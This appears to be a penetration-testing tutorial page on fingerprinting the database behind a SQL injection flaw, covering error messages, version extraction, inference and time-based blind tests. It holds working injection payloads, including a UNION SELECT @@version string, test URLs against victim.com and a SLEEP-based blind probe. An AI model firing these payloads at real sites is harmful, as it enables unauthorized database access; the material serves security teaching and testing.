---
title: "Database Fingerprinting for SQL Injection: Identifying the Underlying DBMS"
description: "Learn more about SQLMap"
icon: "code"
draft: false
---

Database fingerprinting is a crucial step in SQL injection attacks. Identifying the underlying database management system (DBMS) allows attackers to fine-tune their injected segments and fully exploit vulnerabilities. This guide explores techniques for fingerprinting a database using SQL injection.

### Error Messages
One of the simplest ways to fingerprint a database is through error messages. When a database error is generated, the error message often includes information about the DBMS.

**Example:**
```plaintext
ORA-01789: query block has incorrect number of result columns.
```
The error prefix "ORA" and the 5-digit error number indicate that Oracle is the underlying database. Each DBMS has a unique error message structure, making it easier to identify the DBMS.

### Extracting Database Version
Another method to identify the DBMS is to retrieve the database version using a `UNION SELECT` statement. Here’s how to obtain the database version for popular DBMS:

- **Oracle:** `SELECT banner FROM v$version WHERE rownum=1;`
- **SQL Server and MySQL:** `SELECT @@version;`

**Example Injection:**
```sql
1 AND 1=2 UNION SELECT 1, 2, @@version
```
**Resulting Query:**
```sql
SELECT id, qty, name FROM products WHERE id=1 UNION SELECT 1, 2, @@version;
```
**Example Result:**
```plaintext
Microsoft SQL Server 2008 (SP1) - 10.0.2531.0 (X64) 
Mar 29 2009 10:11:52
Copyright (c) 1988-2008 Microsoft Corporation
Express Edition (64-bit) on Windows NT 6.1 <X64> (Build 7601: Service Pack 1)
```
This output not only identifies the DBMS but also provides detailed version information.

### Inference Database Fingerprinting
If no direct information is returned to the end user, the attacker can still identify the DBMS using inference testing. The idea is to submit SQL segments valid only for one specific DBMS. If the segment executes successfully, the DBMS is identified.

#### Numeric Input
Inject a numeric function that exists in only one DBMS. If the function is not recognized, an error will occur. Otherwise, the function will execute and return a value.

**Numeric Functions:**
- **MySQL:** `POW(1,1)`
- **Oracle:** `BITAND(1,1)`
- **SQL Server:** `SQUARE(1)`

**Example Test for MySQL:**
```plaintext
http://www.victim.com/author.php?id=6-POW(1,1)
```
If the same page is displayed as with the original URL, it suggests that MySQL is the backend database.

#### Text Input
Use text functions or concatenation operators unique to each DBMS.

**Concatenation Operators:**
- **Oracle:** `'abc' || 'def'`
- **MySQL:** `'abc' 'def'`
- **SQL Server:** `'abc' + 'def'`

**Example Test for MySQL:**
```plaintext
http://www.victim.com/author.php?nickname='Steeve' 'Jobs'
```
If the same page is returned, MySQL is likely the DBMS.

### Blind SQL Injection
For blind SQL injection, inference testing can be used with functions unique to a single DBMS. A time-based test is often effective.

**Example Time-Based Test:**
```sql
SELECT id, qty, name FROM products WHERE id=1 AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0);
```
If the response is delayed, it indicates the database server is running MySQL version 5.x.

### Alternative Solutions
When previous techniques fail, assumptions can be made based on the web application technology. For example:
- **ASP.NET applications** are likely using **SQL Server**.
- **PHP applications** typically use **MySQL**.

Network scanning tools like **nmap** can also fingerprint databases but are outside the scope of SQL injection techniques.

### Conclusion
Identifying the underlying DBMS is critical for exploiting SQL injection vulnerabilities effectively. Techniques like error message analysis, version extraction, inference testing, and time-based attacks provide various ways to fingerprint a database. Using these methods, attackers can tailor their injection strategies to the specific database system, maximizing the impact of their attacks. Always ensure that such activities are conducted ethically and with proper authorization.